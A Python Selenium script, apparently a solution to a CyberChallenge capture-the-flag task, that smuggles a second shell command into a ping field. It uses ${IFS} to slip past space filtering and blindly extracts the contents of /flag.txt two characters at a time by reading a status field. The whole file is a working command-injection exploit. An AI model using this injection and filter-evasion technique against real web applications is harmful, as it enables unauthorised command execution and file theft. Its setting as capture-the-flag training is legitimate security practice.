import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import string
import pickle

#alfabeto = string.printable[0:94];
alfabeto = "0134cfgilmnostCIPT$.^_{}"

out = [];

chromedriver = "/usr/local/bin/chromedriver"
os.environ["webdriver.chrome.driver"] = chromedriver
driver = webdriver.Chrome(chromedriver)
driver.get("http://basicrce.challs.cyberchallenge.it/")
txt = driver.find_element_by_id("textarea")
txt.send_keys("www.google.com;grep${IFS}${IFS}'^CCaa'${IFS}/flag.txt&&ls")
driver.execute_script("ping()")
c='aa'

for lettera1 in alfabeto:
	for lettera in alfabeto:
		c_ = c
		c = lettera1+lettera
		txt.clear();
		txt.send_keys("www.google.com;grep${IFS}${IFS}'^CC"+c+"'${IFS}/flag.txt&&ls")
		status = driver.find_element_by_id("status").text[13]
		driver.execute_script("ping()")
		out.append([c_, int(status)])

with open('out', 'wb') as f:
	pickle.dump(out, f)
print(out)